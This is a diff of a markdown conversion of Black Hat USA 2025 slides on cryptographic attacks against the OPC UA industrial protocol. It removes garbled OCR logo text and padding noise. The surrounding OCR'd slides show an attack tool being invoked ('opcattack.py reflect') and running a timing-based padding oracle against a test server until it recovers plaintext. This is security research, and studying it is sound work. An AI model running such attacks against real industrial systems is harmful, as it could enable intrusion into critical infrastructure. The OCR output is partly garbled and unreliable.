@@ -22,7 +22,6 @@ converted_at: "2026-08-11T23:02:36Z"
 **Conference:** Black Hat USA 2025  
 **Source:** `BlackHat_USA_2025_Slides/Tom Tervoort_No VPN Needed Cryptographic Attacks Against the OPC UA Protocol.pdf` (31 pages)
 
-
 ## Slide 1
 
 ## No VPN Needed? Cryptographic Attacks Against the OPC UA Protocol
@@ -89,9 +88,7 @@ Photos by Magda Ehlers, Tom Fisk, Pixabay, Mattcmoi
 > Text below was recovered by OCR from an image-only slide; treat wording as approximate.
 
 ```text
-bisekhat &, er Ge | Jj 7
 ,
-BRIEFINGS ; ‘. Y . » X ; A
 Photos by Magda Ehlers, Tom Fisk, Pixabay, Mattcmoi
 ```
 
@@ -322,9 +319,7 @@ OPC UA over HTTPS
 > Text below was recovered by OCR from an image-only slide; treat wording as approximate.
 
 ```text
-blackhat , > oe yf Y
 ,
-BRIEFINGS = 4 Q ‘| Y
 ar : $ python3 opcattack.py reflect https://opc-testserver:62540/
 attempting reflection attack against https://opc-testserver:62540/
 Server advertises 7 endpoints.
@@ -554,7 +549,6 @@ None of the endpoints qualify for Password oracle.
 None of the endpoints qualify for Password (alt) oracle.
 Continuing with Timing-based OPN padding oracle for endpoint opc.tcp://opc-testserver:4840.
 Padded hash of payload: oooiffffrrTTTT TFT FF FFF FFF FFF FFF FFF FFF FFF FFF FT FTF FF FFF FF FFF FFF FF FFF FT FFF FF fF FF FFF FF FFF FF FFF FFF FF FFF FFF FF FFF FF FFF FF FFF Ff FFF FFF FF FFF FF FFF FFFFF
-FFFFFFFFFF FFE FFE FF FFF FFF FF FFF FF FF FF FF FF FFF FF FF FFF FF FF FF FF FFF FF FF FFF FFF FFF FF FFF FF FF FF FF FF FFF FF FF FF FFF FF FF FF FFF FF FF FF FFF FF FF FF FF FFF FF FF FF FF FFF FF FF FF FF FFF FF FF FF FFF FF FF FF FFF
 FF FFFFFFFFFFFFFFFFF EEF FFE FFF EFF FEF EEE FOO3021300906052b0e03021a050004140ca3233b89100d91b58849c64aa51e758e027005
 *] Starting padding oracle attack...
 |] Progress: iteration 0; interval size: 4.93E+611; oracle queries: 111
@@ -591,7 +585,6 @@ None of the endpoints qualify for Password oracle.
 None of the endpoints qualify for Password (alt) oracle.
 Continuing with Timing-based OPN padding oracle for endpoint opc.tcp://opc-testserver:4840.
 Padded hash of payload: oooiffffrrTTTT TFT FF FFF FFF FFF FFF FFF FFF FFF FFF FT FTF FF FFF FF FFF FFF FF FFF FT FFF FF fF FF FFF FF FFF FF FFF FFF FF FFF FFF FF FFF FF FFF FF FFF Ff FFF FFF FF FFF FF FFF FFFFF
-FFFFFFFFFFFF EFF FFF FFF FFF FF FFF fF Tf Ff ff fff fff fF fF Ff ff ff Ff fF Ff Ff fF Ff Ff fF ff Ff ff Ff fF fF ff Ff ff ff Ff ff Ff ff ff Ff fF Ff fF fF Ff Ff fF Ff Ff ff Ff Ff fF Ff fF ff Ff Ff Ff Ff fF FF Ff fF Ff Ff ff Ff fF ff fff ff Ff Ff ff Ff fF fF Ff fF FFF fF FFF
 FFFFFFFFFFFFFFFFFF FFF FFF FFFFFF PEF FFF FT FT TF £FFO03021300906052b0e03021a050004140ca3233b89100d91b58849c64aa51e758e027005
 [*] Starting padding oracle attack...
 [\] Progress: iteration 1; interval size: 4.93E+611; oracle queries: 3686
@@ -626,7 +619,6 @@ None of the endpoints qualify for Password oracle.
 None of the endpoints qualify for Password (alt) oracle.
 Continuing with Timing-based OPN padding oracle for endpoint opc.tcp://opc-testserver:4840.
 Padded hash of payload: oooiffffrrTTTrT TFT FFF FFF F FFF FT FFF FT FFF FTF FFF FT FFF FF FFF FF FFF Ff FFF FFF FTF FFF FF fF FF FFF FF FFF FFF FF FFF FF FFF Ff FFF Ff ff FF Ff FFF FF FFF Ff FFF FFF FF FFF FFF FFF FFFF
-FFFFFFFFFF EFF FEF FFF FFF FFF FFF FF FF FF FFF FF FF FF FF FF FFF FF FF FF FFF FF FF FF FF FFF FF FF FF FFF FF FF FF FF FFF FF FF FF FFF FF FF FF FF FFF FF FF FF FFF FF FF FF FF FFF FF FF FF FFF FF FF FF FF FFF FF FF FF FFF FF FF FF FFF
 FF FFFFFFFFFFFFF FFF ££ FFE SE FFF FF FF EFF EPP O03021300906052b0e03021a050004140ca3233b89100d91b58849c64aa51e758e027005
 *] Starting padding oracle attack...
 fl ] Progress: iteration 252; interval size: 2.94E+531; oracle queries: 49323
@@ -644,8 +636,6 @@ File Edit Run Help
 
 ```text
 Gn. —
-bisekhat &, ma te > y jp 2
-BRIEFINGS ; | Vy Sb j y,
 Got the signature, and...
 [*] Continuing with Timing-based OPN padding oracle for endpoint opc.tcp://opc-testserver :4840.
 [*] Padded hash of payload: OOo1fffFFFFFFFFFFFFFFFFFF FFT fff fff rrrrrrrrrrrrrrtrttttttttttttttt rrr rrrrrrrrrrrrtttttttttttttttttrrrrrrrrrrrrrrt ttt ttt ttttttttttt rrr rrrrrrt
@@ -702,9 +692,7 @@ top
 > Text below was recovered by OCR from an image-only slide; treat wording as approximate.
 
 ```text
-black hat \ ee y a 2
 ,
-BRIEFINGS UY ey y A y
 here we go!
 [/] Progress: iteration 2016; interval size: 2.00E+0; oracle queries: 3470896
 [+] Success! Got the following plaintext: 0002198568a3410e38090001000000010000000100c10199e6 7ca6dce5db019000000000000000000F FFT fff FO0000000000000cef500000800000099e67caédce.
